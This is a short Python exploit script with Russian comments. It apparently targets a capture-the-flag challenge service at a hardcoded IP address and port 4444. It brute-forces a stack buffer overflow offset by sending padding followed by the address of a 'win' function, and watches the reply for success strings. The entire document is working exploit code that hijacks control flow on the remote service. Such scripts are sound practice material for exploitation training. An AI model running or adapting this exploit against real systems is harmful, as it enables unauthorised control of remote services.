import socket
import struct
import time

# Настройки
host = "13.50.17.47"
port = 4444
# Адрес функции win() 0x401276 в формате 64-бит (Little Endian)
win_addr = struct.pack("<Q", 0x401276)

print("--- Начинаю брутфорс (без внешних библиотек) ---")

for offset in range(1, 128):
    try:
        # Создаем соединение
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((host, port))

        # Читаем приветствие сервера
        s.recv(1024)

        # Формируем Payload: ААА... + адрес
        payload = b"A" * offset + win_addr + b"\n"

        # Отправляем
        s.send(payload)

        # Ждем результат
        time.sleep(0.2)
        response = s.recv(1024).decode('utf-8', errors='ignore')

        print(f"Пробую офсет {offset}...", end='\r')

        if "Congratulations" in response or "hexagon" in response:
            print(f"\n\n[+] УСПЕХ! Офсет найден: {offset}")
            print(f"Ответ сервера: {response}")
            s.close()
            break

        s.close()
    except Exception as e:
        continue

print("\n--- Готово ---")